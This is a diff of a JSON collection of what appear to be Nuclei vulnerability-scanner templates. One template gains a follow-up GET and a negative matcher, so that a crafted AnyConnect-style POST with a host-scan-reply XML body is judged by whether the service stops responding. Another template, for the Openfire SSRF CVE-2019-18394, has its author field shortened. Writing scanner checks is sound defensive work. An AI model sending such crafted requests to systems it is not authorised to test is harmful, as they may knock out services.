@@ -1646,12 +1646,20 @@
                 "status_code_2 == 504"
               ],
               "type": "dsl"
+            },
+            {
+              "dsl": [
+                "status_code_3 == 200"
+              ],
+              "negative": true,
+              "type": "dsl"
             }
           ],
           "matchers-condition": "and",
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
-            "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nX-Aggregate-Auth: 1\nX-Transcend-Version: 1\nAccept-Encoding: identity\nX-AnyConnect-Platform: linux-64\nX-Support-HTTP-Auth: false\nX-Pad: 0000000000000000000000000000000000000000\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"a\" type=\"a\" aggregate-auth-version=\"a\">\n    <host-scan-reply>A</host-scan-reply>\n</config-auth>\n"
+            "POST / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nContent-Type: application/x-www-form-urlencoded\nX-Aggregate-Auth: 1\nX-Transcend-Version: 1\nAccept-Encoding: identity\nX-AnyConnect-Platform: linux-64\nX-Support-HTTP-Auth: false\nX-Pad: 0000000000000000000000000000000000000000\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<config-auth client=\"a\" type=\"a\" aggregate-auth-version=\"a\">\n    <host-scan-reply>A</host-scan-reply>\n</config-auth>\n",
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n"
           ],
           "req-condition": true
         }
@@ -4129,7 +4137,7 @@
     {
       "id": "CVE-2019-18394",
       "info": {
-        "author": "pdteam - nuclei.projectdiscovery.io",
+        "author": "pdteam",
         "description": "A Server Side Request Forgery (SSRF) vulnerability in FaviconServlet.java in Ignite Realtime Openfire through 4.4.2 allows attackers to send arbitrary HTTP GET requests.",
         "name": "Openfire Full Read SSRF",
         "refrense": "- https://swarm.ptsecurity.com/openfire-admin-console/\n- https://github.com/igniterealtime/Openfire/pull/1497\n",
